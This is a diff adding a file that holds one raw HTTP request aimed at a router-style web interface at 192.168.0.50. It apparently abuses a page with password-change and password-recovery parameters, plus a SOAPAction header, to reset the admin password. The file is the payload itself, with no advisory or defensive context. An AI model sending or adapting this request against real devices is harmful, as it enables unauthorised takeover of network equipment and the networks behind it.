@@ -1,0 +1,6 @@
+GET /PLC_scan_result.htm?submit_flag=factory&sysLoginTimeOut=1&sysNewPasswd=1&sysOldPasswd=1&enable_password_recovery=1&answer2=1&question2=1&PWD_answer1=1&PWD_answer2=1&PWD_question2=1&hidden_enable_recovery=9&answer1=1&question1=1&PWD_question1=1 HTTP/1.1
+HOST: 192.168.0.50
+Content-Type: text/html
+SOAPAction: "http://example.com:service:apply.cgi:#debuginfo.htm"
+Content-Length: 0
+
